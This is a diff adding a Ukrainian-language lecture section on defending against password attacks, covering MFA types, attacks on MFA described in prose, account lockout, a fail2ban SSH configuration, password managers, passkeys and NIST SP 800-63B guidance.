+          <li><strong>Вектор:</strong> password spraying на тестовий обліковий запис без MFA</li>
+          <li><strong>Атакуючий:</strong> APT29 / Cozy Bear (російська розвідка)</li>
+          <li><strong>Наслідки:</strong> доступ до корпоративних email, включаючи листування керівництва Microsoft</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.8 Захист від атак на паролі                                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.8 Захист від атак на паролі</h2>
+
+        <p>Ефективний захист від атак на паролі потребує <strong>багаторівневого підходу</strong>: від вибору стійких алгоритмів хешування до впровадження безпарольної автентифікації. Жоден окремий захід не є достатнім — лише їх комбінація забезпечує надійний захист.</p>
+
+        <h3>Multi-Factor Authentication (MFA)</h3>
+        <p><strong>MFA</strong> (багатофакторна автентифікація) — найефективніший захист від атак на паролі. За даними Microsoft (2023), MFA блокує <strong>99.9% автоматизованих атак</strong>.</p>
+        <p>Три фактори автентифікації:</p>
+        <ul>
+          <li><strong>Knowledge (знання)</strong> — пароль, PIN, секретне питання</li>
+          <li><strong>Possession (володіння)</strong> — телефон, апаратний ключ, смарт-карта</li>
+          <li><strong>Inherence (властивість)</strong> — біометрія: відбиток пальця, обличчя, голос</li>
+          <li><strong>Location (додатковий)</strong> — геолокація, IP-адреса, мережа</li>
+        </ul>
+
+        <p>Типи MFA:</p>
+        <table>
+          <tr>
+            <th>Тип</th>
+            <th>Як працює</th>
+            <th>Безпека</th>
+          </tr>
+          <tr>
+            <td><strong>TOTP</strong></td>
+            <td>Генерація 6-цифрового коду кожні 30 секунд (Google Authenticator, Authy, Microsoft Authenticator)</td>
+            <td>Висока. Вразливий до фішингу з real-time relay</td>
+          </tr>
+          <tr>
+            <td><strong>Push notification</strong></td>
+            <td>Повідомлення на телефон: «Підтвердити вхід?» (Microsoft Authenticator, Duo)</td>
+            <td>Висока. Вразливий до MFA Fatigue</td>
+          </tr>
+          <tr>
+            <td><strong>SMS OTP</strong></td>
+            <td>Одноразовий код через SMS</td>
+            <td>Низька. Вразливий до SIM-swap, SS7, перехоплення</td>
+          </tr>
+          <tr>
+            <td><strong>FIDO2 / WebAuthn</strong></td>
+            <td>Апаратний ключ (YubiKey) або біометрія пристрою</td>
+            <td>Найвища. Стійкий до фішингу (криптографічна прив'язка до домену)</td>
+          </tr>
+          <tr>
+            <td><strong>Passkeys</strong></td>
+            <td>FIDO2 з синхронізацією між пристроями (iCloud, Google)</td>
+            <td>Найвища. Замінює паролі повністю</td>
+          </tr>
+        </table>
+
+        <h3>Атаки на MFA</h3>
+        <ul>
+          <li><strong>MFA Fatigue / Push Bombing</strong> — масове надсилання push-повідомлень, поки жертва не натисне «Approve» від втоми. Використовувалось у зламі Uber (2022) групою Lapsus$</li>
+          <li><strong>SIM Swapping</strong> — перенесення номера телефону жертви на SIM-карту атакуючого через соціальну інженерію оператора зв'язку</li>
+          <li><strong>Evilginx2</strong> — reverse proxy для фішингу, що перехоплює session cookies та MFA-токени у реальному часі. Жертва проходить справжній процес логіну, але через проксі атакуючого</li>
+          <li><strong>Real-time relay</strong> — ручне або автоматичне пересилання MFA-кодів у реальному часі</li>
+        </ul>
+
+        <h3>Account Lockout Policy</h3>
+        <p>Типова конфігурація: <strong>5 невдалих спроб &rarr; блокування на 30 хвилин</strong>. Проблема: зловмисник може навмисно блокувати акаунти (DoS). Рішення:</p>
+        <ul>
+          <li><strong>Smart Lockout (Azure AD)</strong> — блокує підозрілі IP, але пропускає легітимні. Використовує ML для розрізнення</li>
+          <li><strong>Progressive delays</strong> — замість повного блокування, збільшувати затримку: 1с, 5с, 30с, 5хв</li>
+          <li><strong>CAPTCHA після N спроб</strong> — рішення, що не блокує легітимних користувачів</li>
+        </ul>
+
+        <h3>Fail2ban</h3>
+        <p><strong>Fail2ban</strong> — інструмент моніторингу логів, що автоматично блокує IP-адреси з підозрілою активністю через iptables/nftables:</p>
+        <pre><code># Конфігурація /etc/fail2ban/jail.local
+[sshd]
+enabled  = true
+port     = ssh
+filter   = sshd
+logpath  = /var/log/auth.log
+maxretry = 5          # Максимум невдалих спроб
+bantime  = 3600       # Час блокування (секунди) = 1 година
+findtime = 600        # Вікно спостереження (секунди) = 10 хвилин
+action   = iptables-multiport[name=sshd, port="ssh"]
+
+# Статус
+sudo fail2ban-client status sshd
+# Status for the jail: sshd
+# |- Filter
+# |  |- Currently failed: 3
+# |  |- Total failed:     147
+# |  `- File list:        /var/log/auth.log
+# `- Actions
+#    |- Currently banned: 2
+#    |- Total banned:     18
+#    `- Banned IP list:   185.x.x.x 91.x.x.x
+
+# Розблокувати IP
+sudo fail2ban-client set sshd unbanip 185.x.x.x
+
+# Підтримувані сервіси:
+# SSH, Apache, Nginx, Postfix, vsftpd, ProFTPD, Dovecot та інші</code></pre>
+
+        <h3>Менеджери паролів</h3>
+        <p>Менеджери паролів вирішують проблему повторного використання паролів, генеруючи унікальний складний пароль для кожного сервісу:</p>
+        <table>
+          <tr>
+            <th>Менеджер</th>
+            <th>Тип</th>
+            <th>Особливості</th>
+          </tr>
+          <tr>
+            <td><strong>Bitwarden</strong></td>
+            <td>Open-source, хмарний/self-hosted</td>
+            <td>Безкоштовний план, аудит коду (Cure53), self-hosting</td>
+          </tr>
+          <tr>
+            <td><strong>KeePass / KeePassXC</strong></td>
+            <td>Офлайн, open-source</td>
+            <td>Локальний файл .kdbx, плагіни, повний контроль</td>
+          </tr>
+          <tr>
+            <td><strong>1Password</strong></td>
+            <td>Комерційний, хмарний</td>
+            <td>Travel Mode, Secret Key + Master Password, Watchtower</td>
+          </tr>
+          <tr>
+            <td><strong>LastPass</strong></td>
+            <td>Комерційний, хмарний</td>
+            <td>Зазнав витоків (2022): зашифровані сховища + метадані вкрадені</td>
+          </tr>
+        </table>
+
+        <h3>Passkeys (FIDO2 / WebAuthn)</h3>
+        <p><strong>Passkeys</strong> — нове покоління автентифікації, що <strong>повністю замінює паролі</strong> криптографічними ключами:</p>
+        <ul>
+          <li><strong>Принцип:</strong> публічний ключ зберігається на сервері, приватний — на пристрої користувача (TPM, Secure Enclave)</li>
+          <li><strong>Phishing-resistant:</strong> криптографічно прив'язані до домену. Passkey для google.com не спрацює на g00gle.com</li>
+          <li><strong>Розблокування:</strong> біометрія (Touch ID, Face ID) або PIN на пристрої</li>
+          <li><strong>Синхронізація:</strong> iCloud Keychain (Apple), Google Password Manager (Android/Chrome)</li>
+          <li><strong>Стандарт:</strong> WebAuthn (W3C) + CTAP2 (FIDO Alliance)</li>
+        </ul>
+
+        <p>Впровадження passkeys:</p>
+        <ul>
+          <li><strong>Google</strong> — 400+ мільйонів акаунтів з passkeys (2024)</li>
+          <li><strong>Microsoft</strong> — passkeys за замовчуванням для нових акаунтів</li>
+          <li><strong>Apple</strong> — інтеграція в iOS/macOS через iCloud Keychain</li>
+          <li><strong>GitHub</strong> — підтримка passkeys для всіх акаунтів</li>
+        </ul>
+
+        <h3>Рекомендації NIST SP 800-63B</h3>
+        <table>
+          <tr>
+            <th>Рекомендація</th>
+            <th>Старий підхід</th>
+            <th>Сучасний підхід (NIST)</th>
+          </tr>
+          <tr>
+            <td><strong>Довжина</strong></td>
+            <td>Мінімум 8 символів</td>
+            <td>Мінімум 8, рекомендовано <strong>12+</strong></td>
+          </tr>
+          <tr>
+            <td><strong>Складність</strong></td>
+            <td>Обов'язково: велика + маленька + цифра + спецсимвол</td>
+            <td><strong>Не вимагати</strong> composition rules. Довжина важливіша за складність</td>
+          </tr>
+          <tr>
+            <td><strong>Ротація</strong></td>
+            <td>Зміна кожні 60-90 днів</td>
+            <td><strong>Не вимагати</strong> періодичної зміни (лише при підозрі на компрометацію)</td>
+          </tr>
+          <tr>
+            <td><strong>Перевірка</strong></td>
+            <td>Без перевірки</td>
+            <td>Перевіряти проти <strong>breach lists</strong> (HIBP API)</td>
+          </tr>
+          <tr>
+            <td><strong>Словникова перевірка</strong></td>
+            <td>Ні</td>
+            <td>Блокувати <strong>типові паролі</strong> (dictionary check)</td>
+          </tr>
+          <tr>
+            <td><strong>Символи</strong></td>
+            <td>Обмежений набір</td>
+            <td>Дозволяти <strong>всі друковані</strong> символи, включаючи пробіли</td>
+          </tr>
+          <tr>
+            <td><strong>MFA</strong></td>
+            <td>Опціонально</td>
+            <td><strong>Обов'язково</strong> для чутливих систем (AAL2+)</td>
+          </tr>
+          <tr>
+            <td><strong>Password hints</strong></td>
+            <td>Дозволено</td>
+            <td><strong>Заборонено</strong></td>
+          </tr>
+        </table>
+
+        <h3>Zero Trust автентифікація</h3>
+        <p>Принцип <strong>Zero Trust</strong> — «ніколи не довіряй, завжди перевіряй» — застосовується до автентифікації:</p>
+        <ul>
+          <li><strong>Continuous verification</strong> — перевірка не лише при вході, але постійно протягом сесії</li>
+          <li><strong>Context-aware access</strong> — враховувати геолокацію, пристрій, час, мережу</li>
+          <li><strong>Least privilege</strong> — мінімально необхідні привілеї для кожної сесії</li>
+          <li><strong>Micro-segmentation</strong> — кожен ресурс потребує окремої автентифікації</li>
+          <li><strong>Assume breach</strong> — проєктувати системи, виходячи з того, що периметр вже скомпрометований</li>
+        </ul>
+
+        <h3>Підсумок: багаторівневий захист</h3>
+        <table>
+          <tr>
+            <th>Рівень</th>
+            <th>Міра захисту</th>
+            <th>Від чого захищає</th>
+          </tr>
+          <tr>
+            <td><strong>Зберігання</strong></td>
+            <td>Argon2id / bcrypt з високим cost factor</td>
+            <td>Офлайн-атаки (hashcat, JtR)</td>
+          </tr>
+          <tr>
+            <td><strong>Автентифікація</strong></td>
+            <td>MFA (FIDO2 / TOTP)</td>
+            <td>Credential stuffing, фішинг</td>
+          </tr>
+          <tr>
+            <td><strong>Мережа</strong></td>
+            <td>Fail2ban, rate limiting, CAPTCHA</td>
+            <td>Онлайн-брутфорс (Hydra)</td>
+          </tr>
+          <tr>
+            <td><strong>Політики</strong></td>
+            <td>Мінімум 12 символів, breach list check</td>
+            <td>Слабкі та скомпрометовані паролі</td>
+          </tr>
+          <tr>
+            <td><strong>Користувач</strong></td>
+            <td>Password manager, унікальні паролі</td>
+            <td>Password reuse, credential stuffing</td>
+          </tr>
+          <tr>
+            <td><strong>Майбутнє</strong></td>
+            <td>Passkeys (FIDO2/WebAuthn)</td>
+            <td>Усі парольні атаки (повна заміна паролів)</td>
+          </tr>
+        </table>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/5.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/7.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="5.html" class="nav-btn">&larr; Попередня</a>
+      <a href="7.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
